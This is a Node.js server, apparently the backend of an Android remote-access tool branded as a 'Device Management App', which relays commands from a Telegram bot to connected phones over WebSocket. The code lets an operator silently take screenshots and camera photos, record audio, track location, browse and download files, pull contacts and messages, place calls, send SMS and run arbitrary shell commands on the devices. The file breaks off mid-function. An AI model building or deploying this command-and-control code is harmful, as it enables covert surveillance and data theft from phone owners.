require('dotenv').config();
const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const CryptoJS = require('crypto-js');
const helmet = require('helmet');

// Configuration
const token = process.env.TELEGRAM_BOT_TOKEN;
const adminId = process.env.TELEGRAM_CHAT_ID;
const secretKey = process.env.SECRET_KEY;
const encryptionKey = process.env.ENCRYPTION_KEY;

// Security check
if (!token || token.includes('AAHGZy_dy804ZwHoq48SnIK_OadCN2wcQxA')) {
    console.error('❌ SECURITY ALERT: Using compromised token! Regenerate via @BotFather');
    process.exit(1);
}

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, clientTracking: true });
const bot = new TelegramBot(token);
// Set webhook (run once when server starts)
const webhookUrl = `${process.env.SERVER_URL || 'https://your-domain.com'}/webhook/${token}`;
bot.setWebHook(webhookUrl);

// ADD THIS ENDPOINT:
app.post(`/webhook/${token}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});
// Security middleware
app.use(helmet());
app.use(express.json({ limit: '10mb' }));

// Data structures
const connectedDevices = new Map(); // deviceId -> {ws, deviceInfo, lastSeen}
const pendingCommands = new Map(); // deviceId -> [commands]
const userSessions = new Map(); // userId -> {state, data, deviceId}

// Create necessary directories
['uploads', 'logs', 'screenshots'].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir);
});

// File upload configuration
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const type = req.headers['file-type'] || 'unknown';
        const dir = `uploads/${type}`;
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.headers['device-id'] || 'unknown';
        const ext = path.extname(file.originalname);
        const name = path.basename(file.originalname, ext);
        const safeName = `${deviceId}-${Date.now()}-${name}${ext}`;
        cb(null, safeName);
    }
});

const upload = multer({
    storage,
    limits: { fileSize: 100 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        const allowed = /\.(jpg|jpeg|png|gif|mp4|avi|mov|mp3|wav|txt|pdf|apk)$/i;
        if (allowed.test(file.originalname)) {
            cb(null, true);
        } else {
            cb(new Error('File type not allowed'), false);
        }
    }
});

// Logging function
function logEvent(event, deviceId = 'system', details = '') {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] [${deviceId}] ${event}: ${details}\n`;
    fs.appendFileSync('logs/server.log', logEntry);
    console.log(logEntry.trim());
}

// Setup Bot Commands
async function setupBotCommands() {
    const commands = [
        { command: 'start', description: 'Start the DMA bot' },
        { command: 'list', description: 'List connected devices' },
        { command: 'info', description: 'Get device info (requires device ID)' },
        { command: 'cmd', description: 'Execute command on device' },
        { command: 'file', description: 'Get file from device' },
        { command: 'screen', description: 'Take screenshot' },
        { command: 'call', description: 'Make a call' },
        { command: 'sms', description: 'Send SMS' },
        { command: 'apps', description: 'List installed apps' },
        { command: 'location', description: 'Get location' },
        { command: 'camera', description: 'Take photo' },
        { command: 'record', description: 'Record audio' },
        { command: 'shell', description: 'Run shell command' },
        { command: 'files', description: 'Browse files' },
        { command: 'contacts', description: 'Get contacts' },
        { command: 'messages', description: 'Get messages' },
        { command: 'settings', description: 'Device settings' },
        { command: 'help', description: 'Show help message' },
        { command: 'keyboard', description: 'Show interactive keyboard' }
    ];

    await bot.setMyCommands(commands);
    console.log('✅ Bot commands set up successfully');
}

// Interactive keyboards
const mainKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📱 List Devices' }, { text: 'ℹ️ Device Info' }],
            [{ text: '📸 Screenshot' }, { text: '📍 Location' }],
            [{ text: '📁 Files' }, { text: '📞 Call' }],
            [{ text: '💬 SMS' }, { text: '📷 Camera' }],
            [{ text: '🎤 Record' }, { text: '📱 Apps' }],
            [{ text: '⚙️ Settings' }, { text: '❓ Help' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    }
};

const deviceSelectionKeyboard = (devices) => {
    const buttons = [];
    devices.forEach((device, id) => {
        buttons.push([{ 
            text: `${device.deviceInfo.model} (${id.substring(0, 8)}...)` 
        }]);
    });
    buttons.push([{ text: '🔙 Back to Main Menu' }]);
    
    return {
        reply_markup: {
            keyboard: buttons,
            resize_keyboard: true,
            one_time_keyboard: true
        }
    };
};

const cameraTypeKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📷 Front Camera' }, { text: '📷 Rear Camera' }],
            [{ text: '🔙 Back' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
    }
};

const fileActionsKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📥 Download' }, { text: '🗑️ Delete' }],
            [{ text: '📁 List Files' }, { text: '📊 Get Info' }],
            [{ text: '🔙 Back' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
    }
};

const recordDurationKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '⏱️ 10 seconds' }, { text: '⏱️ 30 seconds' }],
            [{ text: '⏱️ 1 minute' }, { text: '⏱️ 5 minutes' }],
            [{ text: '🔙 Back' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
    }
};

const settingsKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '🔔 Notification Settings' }, { text: '📊 Auto Report' }],
            [{ text: '🔐 Security Settings' }, { text: '⚡ Performance' }],
            [{ text: '🔄 Update Interval' }, { text: '🗑️ Clear Data' }],
            [{ text: '🔙 Back' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
    }
};

const removeKeyboard = {
    reply_markup: {
        remove_keyboard: true
    }
};

// User session management
function setUserSession(userId, data) {
    userSessions.set(userId, { ...data, timestamp: Date.now() });
}

function getUserSession(userId) {
    return userSessions.get(userId);
}

function clearUserSession(userId) {
    userSessions.delete(userId);
}

// WebSocket connection handler
wss.on('connection', (ws, req) => {
    try {
        const authToken = req.headers['authorization'];
        const deviceId = req.headers['device-id'];
        const deviceModel = req.headers['device-model'] || 'Unknown';
        const androidVersion = req.headers['android-version'] || 'Unknown';
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        // Basic authentication
        if (!deviceId || !authToken) {
            ws.close(1008, 'Missing credentials');
            return;
        }

        const deviceInfo = {
            id: deviceId,
            model: deviceModel,
            androidVersion,
            ip,
            connectedAt: new Date().toISOString(),
            lastSeen: Date.now()
        };

        ws.deviceId = deviceId;
        connectedDevices.set(deviceId, { ws, deviceInfo, lastSeen: Date.now() });

        // Send welcome message to Telegram
        const message = `
📱 *New Device Connected - DMA*
• *Device:* ${deviceModel}
• *Android:* ${androidVersion}
• *ID:* \`${deviceId}\`
• *IP:* ${ip}
• *Time:* ${new Date().toLocaleString()}
        `;

        bot.sendMessage(adminId, message, { parse_mode: 'Markdown' });
        logEvent('DEVICE_CONNECTED', deviceId, `${deviceModel} (${androidVersion})`);

        // Handle incoming messages
        ws.on('message', (data) => {
            try {
                const message = JSON.parse(data.toString());
                handleDeviceMessage(deviceId, message);
            } catch (error) {
                console.error('Message parse error:', error);
            }
            connectedDevices.get(deviceId).lastSeen = Date.now();
        });

        // Handle disconnection
        ws.on('close', () => {
            connectedDevices.delete(deviceId);
            bot.sendMessage(adminId, `📴 Device disconnected: \`${deviceId}\``, { parse_mode: 'Markdown' });
            logEvent('DEVICE_DISCONNECTED', deviceId);
        });

        // Send pending commands
        if (pendingCommands.has(deviceId)) {
            const commands = pendingCommands.get(deviceId);
            commands.forEach(cmd => {
                ws.send(JSON.stringify(cmd));
            });
            pendingCommands.delete(deviceId);
        }

        // Send initial command to get device info
        ws.send(JSON.stringify({
            type: 'command',
            id: uuidv4(),
            command: 'get_device_info',
            timestamp: Date.now()
        }));

    } catch (error) {
        console.error('Connection error:', error);
        ws.close(1011, 'Server error');
    }
});

// Handle device messages
function handleDeviceMessage(deviceId, message) {
    const device = connectedDevices.get(deviceId);
    if (!device) return;

    switch (message.type) {
        case 'response':
            handleCommandResponse(deviceId, message);
            break;
        case 'file_upload':
            handleFileUpload(deviceId, message);
            break;
        case 'device_info':
            updateDeviceInfo(deviceId, message.data);
            break;
        case 'error':
            bot.sendMessage(adminId, `❌ Error from ${deviceId}:\n\`${message.error}\``, { parse_mode: 'Markdown' });
            break;
        default:
            console.log('Unknown message type:', message.type);
    }
}

// Update device information
function updateDeviceInfo(deviceId, info) {
    const device = connectedDevices.get(deviceId);
    if (device) {
        device.deviceInfo = { ...device.deviceInfo, ...info };
        bot.sendMessage(adminId, `📊 Device Info Update:\n\`${JSON.stringify(info, null, 2)}\``, { parse_mode: 'Markdown' });
    }
}

// Handle command responses
function handleCommandResponse(deviceId, response) {
    if (response.success) {
        if (response.data) {
            bot.sendMessage(adminId, `✅ Command executed on ${deviceId}\nResult: \`${JSON.stringify(response.data)}\``, { parse_mode: 'Markdown' });
        }
    } else {
        bot.sendMessage(adminId, `❌ Command failed on ${deviceId}\nError: ${response.error}`, { parse_mode: 'Markdown' });
    }
}

// Handle file upload notifications
function handleFileUpload(deviceId, message) {
    bot.sendMessage(adminId, `📁 File uploaded from ${deviceId}\nType: ${message.fileType}\nPath: ${message.filePath}`, { parse_mode: 'Markdown' });
}

// Send command to device
function sendCommandToDevice(deviceId, command, data = {}) {
    const device = connectedDevices.get(deviceId);
    if (!device) {
        return false;
    }
    
    const cmdObj = {
        type: 'command',
        id: uuidv4(),
        command: command,
        data: data,
        timestamp: Date.now()
    };
    
    try {
        device.ws.send(JSON.stringify(cmdObj));
        return true;
    } catch (error) {
        console.error('Send command error:', error);
        return false;
    }
}

// Telegram Bot Handlers
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (chatId.toString() !== adminId) {
        bot.sendMessage(chatId, '⛔ Unauthorized access');
        return;
    }
    
    // Setup commands
    await setupBotCommands();
    
    const welcome = `
🤖 *DMA - Device Management App*
    
Welcome to the Device Management System! You can control all connected devices from here.

*Available Commands:*
• Use buttons below for quick actions
• Type commands like /list, /info, etc.
• Or use the interactive keyboard

*Quick Start:*
1. First, check connected devices with /list
2. Select a device from the list
3. Use buttons to perform actions

*Note:* Some features require specific permissions on the device.
    `;
    
    bot.sendMessage(chatId, welcome, { 
        parse_mode: 'Markdown',
        reply_markup: mainKeyboard.reply_markup 
    });
});

bot.onText(/\/keyboard/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    bot.sendMessage(chatId, '🔄 Showing interactive keyboard...', mainKeyboard);
});

bot.onText(/\/list/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    if (connectedDevices.size === 0) {
        bot.sendMessage(chatId, '📭 No devices connected', removeKeyboard);
        return;
    }
    
    let response = `📱 *Connected Devices (${connectedDevices.size}):*\n\n`;
    connectedDevices.forEach((device, id) => {
        const uptime = Math.floor((Date.now() - device.lastSeen) / 60000);
        response += `• *${device.deviceInfo.model}*\n`;
        response += `  ID: \`${id}\`\n`;
        response += `  Android: ${device.deviceInfo.androidVersion}\n`;
        response += `  Uptime: ${uptime} mins\n`;
        response += `  IP: ${device.deviceInfo.ip}\n\n`;
    });
    
    bot.sendMessage(chatId, response, { 
        parse_mode: 'Markdown',
        reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
    });
});

// Interactive button handlers
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (chatId.toString() !== adminId) return;
    
    if (!text) return;
    
    const session = getUserSession(chatId);
    
    // Handle button clicks
    switch (text) {
        case '📱 List Devices':
            bot.sendMessage(chatId, '📱 Selecting device...', deviceSelectionKeyboard(connectedDevices));
            break;
            
        case '🔙 Back to Main Menu':
            bot.sendMessage(chatId, '🔙 Returning to main menu...', mainKeyboard);
            clearUserSession(chatId);
            break;
            
        case '🔙 Back':
            if (session && session.lastState === 'camera') {
                bot.sendMessage(chatId, 'Select action:', mainKeyboard);
                clearUserSession(chatId);
            } else {
                bot.sendMessage(chatId, '🔙 Back to main menu', mainKeyboard);
                clearUserSession(chatId);
            }
            break;
            
        case '📸 Screenshot':
            if (connectedDevices.size === 0) {
                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
                return;
            }
            setUserSession(chatId, { state: 'awaiting_device_for_screenshot' });
            bot.sendMessage(chatId, '📸 Select device for screenshot:', deviceSelectionKeyboard(connectedDevices));
            break;
            
        case '📍 Location':
            if (connectedDevices.size === 0) {
                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
                return;
            }
            setUserSession(chatId, { state: 'awaiting_device_for_location' });
            bot.sendMessage(chatId, '📍 Select device for location:', deviceSelectionKeyboard(connectedDevices));
            break;
            
        case '📷 Camera':
            if (connectedDevices.size === 0) {
                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
                return;
            }
            setUserSession(chatId, { state: 'awaiting_device_for_camera' });
            bot.sendMessage(chatId, '📷 Select device for camera:', deviceSelectionKeyboard(connectedDevices));
            break;
            
        case '📷 Front Camera':
            if (session && session.deviceId) {
                sendCommandToDevice(session.deviceId, 'take_photo', { camera: 'front' });
                bot.sendMessage(chatId, `📷 Taking front camera photo on ${session.deviceId.substring(0, 8)}...`);
                clearUserSession(chatId);
            }
            break;
            
        case '📷 Rear Camera':
            if (session && session.deviceId) {
                sendCommandToDevice(session.deviceId, 'take_photo', { camera: 'rear' });
                bot.sendMessage(chatId, `📷 Taking rear camera photo on ${session.deviceId.substring(0, 8)}...`);
                clearUserSession(chatId);
            }
            break;
            
        case '🎤 Record':
            if (connectedDevices.size === 0) {
                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
                return;
            }
            setUserSession(chatId, { state: 'awaiting_device_for_record' });
            bot.sendMessage(chatId, '🎤 Select device for recording:', deviceSelectionKeyboard(connectedDevices));
            break;
            
        case '⏱️ 10 seconds':
            if (session && session.deviceId) {
                sendCommandToDevice(session.deviceId, 'record_audio', { seconds: 10 });
                bot.sendMessage(chatId, `🎤 Recording 10 seconds on ${session.deviceId.substring(0, 8)}...`);
                clearUserSession(chatId);
            }
            break;
            
        case '⏱️ 30 seconds':
            if (session && session.deviceId) {
                sendCommandToDevice(session.deviceId, 'record_audio', { seconds: 30 });
                bot.sendMessage(chatId, `🎤 Recording 30 seconds on ${session.deviceId.substring(0, 8)}...`);
                clearUserSession(chatId);
            }
            break;
            
        case '⏱️ 1 minute':
            if (session && session.deviceId) {
                sendCommandToDevice(session.deviceId, 'record_audio', { seconds: 60 });
                bot.sendMessage(chatId, `🎤 Recording 1 minute on ${session.deviceId.substring(0, 8)}...`);
                clearUserSession(chatId);
            }
            break;
            
        case '⏱️ 5 minutes':
            if (session && session.deviceId) {
                sendCommandToDevice(session.deviceId, 'record_audio', { seconds: 300 });
                bot.sendMessage(chatId, `🎤 Recording 5 minutes on ${session.deviceId.substring(0, 8)}...`);
                clearUserSession(chatId);
            }
            break;
            
        case '📁 Files':
            if (connectedDevices.size === 0) {
                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
                return;
            }
            setUserSession(chatId, { state: 'awaiting_device_for_files' });
            bot.sendMessage(chatId, '📁 Select device to browse files:', deviceSelectionKeyboard(connectedDevices));
            break;
            
        case '📞 Call':
            if (connectedDevices.size === 0) {
                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
                return;
            }
            setUserSession(chatId, { state: 'awaiting_device_for_call' });
            bot.sendMessage(chatId, '📞 Select device to make call:', deviceSelectionKeyboard(connectedDevices));
            break;
            
        case '💬 SMS':
            if (connectedDevices.size === 0) {
                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
                return;
            }
            setUserSession(chatId, { state: 'awaiting_device_for_sms' });
            bot.sendMessage(chatId, '💬 Select device to send SMS:', deviceSelectionKeyboard(connectedDevices));
            break;
            
        case '📱 Apps':
            if (connectedDevices.size === 0) {
                bot.sendMessage(chatId, '❌ No devices connected', removeKeyboard);
                return;
            }
            setUserSession(chatId, { state: 'awaiting_device_for_apps' });
            bot.sendMessage(chatId, '📱 Select device to list apps:', deviceSelectionKeyboard(connectedDevices));
            break;
            
        case '⚙️ Settings':
            bot.sendMessage(chatId, '⚙️ Device Settings:', settingsKeyboard);
            break;
            
        case '❓ Help':
            showHelp(chatId);
            break;
            
        case '📥 Download':
            if (session && session.deviceId && session.filePath) {
                sendCommandToDevice(session.deviceId, 'download_file', { path: session.filePath });
                bot.sendMessage(chatId, `📥 Downloading file from ${session.deviceId.substring(0, 8)}...`);
                clearUserSession(chatId);
            }
            break;
            
        default:
            // Check if it's a device selection
            if (text.includes('...') && session) {
                handleDeviceSelection(chatId, text, session);
            } else if (session && session.state === 'awaiting_call_number') {
                handleCallNumber(chatId, text, session);
            } else if (session && session.state === 'awaiting_sms_number') {
                handleSmsNumber(chatId, text, session);
            } else if (session && session.state === 'awaiting_sms_message') {
                handleSmsMessage(chatId, text, session);
            } else if (session && session.state === 'awaiting_command') {
                handleCustomCommand(chatId, text, session);
            } else if (session && session.state === 'awaiting_file_path') {
                handleFilePath(chatId, text, session);
            }
    }
});

// Handle device selection from keyboard
function handleDeviceSelection(chatId, text, session) {
    const deviceEntry = Array.from(connectedDevices.entries()).find(([id, device]) => 
        text.includes(device.deviceInfo.model) && text.includes(id.substring(0, 8))
    );
    
    if (!deviceEntry) {
        bot.sendMessage(chatId, '❌ Device not found', removeKeyboard);
        clearUserSession(chatId);
        return;
    }
    
    const [deviceId, device] = deviceEntry;
    const shortId = deviceId.substring(0, 8);
    
    switch (session.state) {
        case 'awaiting_device_for_screenshot':
            sendCommandToDevice(deviceId, 'take_screenshot');
            bot.sendMessage(chatId, `📸 Taking screenshot on ${device.deviceInfo.model} (${shortId})...`);
            clearUserSession(chatId);
            break;
            
        case 'awaiting_device_for_location':
            sendCommandToDevice(deviceId, 'get_location');
            bot.sendMessage(chatId, `📍 Getting location from ${device.deviceInfo.model} (${shortId})...`);
            clearUserSession(chatId);
            break;
            
        case 'awaiting_device_for_camera':
            setUserSession(chatId, { 
                state: 'awaiting_camera_type', 
                deviceId: deviceId,
                lastState: 'camera'
            });
            bot.sendMessage(chatId, `📷 Select camera type for ${device.deviceInfo.model}:`, cameraTypeKeyboard);
            break;
            
        case 'awaiting_device_for_record':
            setUserSession(chatId, { 
                state: 'awaiting_record_duration', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, `🎤 Select recording duration for ${device.deviceInfo.model}:`, recordDurationKeyboard);
            break;
            
        case 'awaiting_device_for_files':
            setUserSession(chatId, { 
                state: 'awaiting_file_path', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, `📁 Enter file path to browse on ${device.deviceInfo.model}:\nExample: /storage/emulated/0/Downloads`, removeKeyboard);
            break;
            
        case 'awaiting_device_for_call':
            setUserSession(chatId, { 
                state: 'awaiting_call_number', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, `📞 Enter phone number to call from ${device.deviceInfo.model}:`, removeKeyboard);
            break;
            
        case 'awaiting_device_for_sms':
            setUserSession(chatId, { 
                state: 'awaiting_sms_number', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, `💬 Enter phone number to send SMS from ${device.deviceInfo.model}:`, removeKeyboard);
            break;
            
        case 'awaiting_device_for_apps':
            sendCommandToDevice(deviceId, 'list_apps');
            bot.sendMessage(chatId, `📱 Getting apps list from ${device.deviceInfo.model} (${shortId})...`);
            clearUserSession(chatId);
            break;
            
        default:
            // Generic device selection - show actions menu
            setUserSession(chatId, { 
                state: 'device_selected', 
                deviceId: deviceId
            });
            
            const deviceMenu = `
📱 *${device.deviceInfo.model}*
ID: \`${shortId}...\`
Android: ${device.deviceInfo.androidVersion}
IP: ${device.deviceInfo.ip}

*Available Actions:*
1. 📸 Take Screenshot
2. 📍 Get Location  
3. 📷 Take Photo
4. 🎤 Record Audio
5. 📁 Browse Files
6. 📞 Make Call
7. 💬 Send SMS
8. 📱 List Apps
9. ⚡ Run Command
            `;
            
            bot.sendMessage(chatId, deviceMenu, { 
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📸 Screenshot', callback_data: `screenshot_${deviceId}` },
                            { text: '📍 Location', callback_data: `location_${deviceId}` }
                        ],
                        [
                            { text: '📷 Camera', callback_data: `camera_${deviceId}` },
                            { text: '🎤 Record', callback_data: `record_${deviceId}` }
                        ],
                        [
                            { text: '📁 Files', callback_data: `files_${deviceId}` },
                            { text: '📞 Call', callback_data: `call_${deviceId}` }
                        ],
                        [
                            { text: '💬 SMS', callback_data: `sms_${deviceId}` },
                            { text: '📱 Apps', callback_data: `apps_${deviceId}` }
                        ],
                        [
                            { text: '⚡ Command', callback_data: `cmd_${deviceId}` }
                        ]
                    ]
                }
            });
    }
}

// Handle call number input
function handleCallNumber(chatId, text, session) {
    const phoneNumber = text.trim();
    
    if (!phoneNumber.match(/^[\d\s\-\+\(\)]{5,}$/)) {
        bot.sendMessage(chatId, '❌ Invalid phone number format. Please enter a valid number:');
        return;
    }
    
    sendCommandToDevice(session.deviceId, 'make_call', { number: phoneNumber });
    bot.sendMessage(chatId, `📞 Calling ${phoneNumber} on device...`);
    clearUserSession(chatId);
}

// Handle SMS number input
function handleSmsNumber(chatId, text, session) {
    const phoneNumber = text.trim();
    
    if (!phoneNumber.match(/^[\d\s\-\+\(\)]{5,}$/)) {
        bot.sendMessage(chatId, '❌ Invalid phone number format. Please enter a valid number:');
        return;
    }
    
    setUserSession(chatId, { 
        state: 'awaiting_sms_message', 
        deviceId: session.deviceId,
        phoneNumber: phoneNumber
    });
    
    bot.sendMessage(chatId, `💬 Enter SMS message for ${phoneNumber}:`);
}

// Handle SMS message input
function handleSmsMessage(chatId, text, session) {
    const message = text.trim();
    
    if (message.length === 0) {
        bot.sendMessage(chatId, '❌ Message cannot be empty. Please enter SMS message:');
        return;
    }
    
    sendCommandToDevice(session.deviceId, 'send_sms', { 
        number: session.phoneNumber, 
        message: message 
    });
    
    bot.sendMessage(chatId, `💬 Sending SMS to ${session.phoneNumber} on device...`);
    clearUserSession(chatId);
}

// Handle custom command input
function handleCustomCommand(chatId, text, session) {
    const command = text.trim();
    
    if (command.length === 0) {
        bot.sendMessage(chatId, '❌ Command cannot be empty. Please enter command:');
        return;
    }
    
    sendCommandToDevice(session.deviceId, 'execute', { cmd: command });
    bot.sendMessage(chatId, `⚡ Executing command on device...\n\`${command}\``, { parse_mode: 'Markdown' });
    clearUserSession(chatId);
}

// Handle file path input
function handleFilePath(chatId, text, session) {
    const filePath = text.trim();
    
    if (filePath.length === 0) {
        bot.sendMessage(chatId, '❌ Path cannot be empty. Please enter file path:');
        return;
    }
    
    // Check if it's a special command
    if (filePath.startsWith('/')) {
        // Handle command
        switch(filePath) {
            case '/list':
                sendCommandToDevice(session.deviceId, 'list_files', { path: '/' });
                bot.sendMessage(chatId, `📁 Listing root directory on device...`);
                break;
            case '/downloads':
                sendCommandToDevice(session.deviceId, 'list_files', { path: '/storage/emulated/0/Downloads' });
                bot.sendMessage(chatId, `📁 Listing Downloads on device...`);
                break;
            case '/pictures':
                sendCommandToDevice(session.deviceId, 'list_files', { path: '/storage/emulated/0/Pictures' });
                bot.sendMessage(chatId, `📁 Listing Pictures on device...`);
                break;
            default:
                sendCommandToDevice(session.deviceId, 'list_files', { path: filePath });
                bot.sendMessage(chatId, `📁 Listing ${filePath} on device...`);
        }
    } else {
        setUserSession(chatId, { 
            state: 'file_selected', 
            deviceId: session.deviceId,
            filePath: filePath
        });
        
        bot.sendMessage(chatId, `📁 File selected: ${filePath}\nChoose action:`, fileActionsKeyboard);
    }
}

// Handle inline keyboard callbacks
bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    
    if (chatId.toString() !== adminId) return;
    
    const [action, deviceId] = data.split('_');
    
    switch(action) {
        case 'screenshot':
            sendCommandToDevice(deviceId, 'take_screenshot');
            bot.answerCallbackQuery(callbackQuery.id, { text: '📸 Taking screenshot...' });
            break;
            
        case 'location':
            sendCommandToDevice(deviceId, 'get_location');
            bot.answerCallbackQuery(callbackQuery.id, { text: '📍 Getting location...' });
            break;
            
        case 'camera':
            setUserSession(chatId, { 
                state: 'awaiting_camera_type', 
                deviceId: deviceId,
                lastState: 'camera'
            });
            bot.sendMessage(chatId, '📷 Select camera type:', cameraTypeKeyboard);
            bot.answerCallbackQuery(callbackQuery.id);
            break;
            
        case 'record':
            setUserSession(chatId, { 
                state: 'awaiting_record_duration', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, '🎤 Select recording duration:', recordDurationKeyboard);
            bot.answerCallbackQuery(callbackQuery.id);
            break;
            
        case 'files':
            setUserSession(chatId, { 
                state: 'awaiting_file_path', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, '📁 Enter file path to browse:\nExample: /storage/emulated/0/Downloads', removeKeyboard);
            bot.answerCallbackQuery(callbackQuery.id);
            break;
            
        case 'call':
            setUserSession(chatId, { 
                state: 'awaiting_call_number', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, '📞 Enter phone number to call:', removeKeyboard);
            bot.answerCallbackQuery(callbackQuery.id);
            break;
            
        case 'sms':
            setUserSession(chatId, { 
                state: 'awaiting_sms_number', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, '💬 Enter phone number to send SMS:', removeKeyboard);
            bot.answerCallbackQuery(callbackQuery.id);
            break;
            
        case 'apps':
            sendCommandToDevice(deviceId, 'list_apps');
            bot.answerCallbackQuery(callbackQuery.id, { text: '📱 Getting apps list...' });
            break;
            
        case 'cmd':
            setUserSession(chatId, { 
                state: 'awaiting_command', 
                deviceId: deviceId
            });
            bot.sendMessage(chatId, '⚡ Enter command to execute:', removeKeyboard);
            bot.answerCallbackQuery(callbackQuery.id);
            break;
    }
});

// Command handlers
bot.onText(/\/cmd/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    if (connectedDevices.size === 0) {
        bot.sendMessage(chatId, '❌ No devices connected');
        return;
    }
    
    setUserSession(chatId, { state: 'awaiting_device_for_command' });
    bot.sendMessage(chatId, '⚡ Select device to execute command:', deviceSelectionKeyboard(connectedDevices));
});

bot.onText(/\/file/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    if (connectedDevices.size === 0) {
        bot.sendMessage(chatId, '❌ No devices connected');
        return;
    }
    
    setUserSession(chatId, { state: 'awaiting_device_for_file' });
    bot.sendMessage(chatId, '📁 Select device to get file:', deviceSelectionKeyboard(connectedDevices));
});

bot.onText(/\/screen (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    const deviceId = match[1];
    const device = connectedDevices.get(deviceId);
    
    if (device) {
        sendCommandToDevice(deviceId, 'take_screenshot');
        bot.sendMessage(chatId, `📸 Screenshot command sent to ${deviceId.substring(0, 8)}...`);
    } else {
        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
    }
});

bot.onText(/\/call (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    const deviceId = match[1];
    const phoneNumber = match[2];
    
    const device = connectedDevices.get(deviceId);
    if (device) {
        sendCommandToDevice(deviceId, 'make_call', { number: phoneNumber });
        bot.sendMessage(chatId, `📞 Calling ${phoneNumber} on ${deviceId.substring(0, 8)}...`);
    } else {
        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
    }
});

bot.onText(/\/sms (.+) (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    const deviceId = match[1];
    const phoneNumber = match[2];
    const message = match[3];
    
    const device = connectedDevices.get(deviceId);
    if (device) {
        sendCommandToDevice(deviceId, 'send_sms', { number: phoneNumber, message: message });
        bot.sendMessage(chatId, `💬 Sending SMS to ${phoneNumber} on ${deviceId.substring(0, 8)}...`);
    } else {
        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
    }
});

bot.onText(/\/apps (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    const deviceId = match[1];
    const device = connectedDevices.get(deviceId);
    
    if (device) {
        sendCommandToDevice(deviceId, 'list_apps');
        bot.sendMessage(chatId, `📱 Getting apps list from ${deviceId.substring(0, 8)}...`);
    } else {
        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
    }
});

bot.onText(/\/location (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    const deviceId = match[1];
    const device = connectedDevices.get(deviceId);
    
    if (device) {
        sendCommandToDevice(deviceId, 'get_location');
        bot.sendMessage(chatId, `📍 Getting location from ${deviceId.substring(0, 8)}...`);
    } else {
        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
    }
});

bot.onText(/\/camera (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    const deviceId = match[1];
    const cameraType = match[2];
    
    const device = connectedDevices.get(deviceId);
    if (device) {
        sendCommandToDevice(deviceId, 'take_photo', { camera: cameraType });
        bot.sendMessage(chatId, `📷 Taking ${cameraType} camera photo on ${deviceId.substring(0, 8)}...`);
    } else {
        bot.sendMessage(chatId, `❌ Device ${deviceId.substring(0, 8)} not connected`);
    }
});

bot.onText(/\/record (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== adminId) return;
    
    const deviceId = match[1];
    const seconds = parseInt(match[2]);
    
    const device = connectedDevices.get(deviceId);
    if (device) {
        sendCommandToDevice(deviceId, 'record_audio', { seconds: seconds });
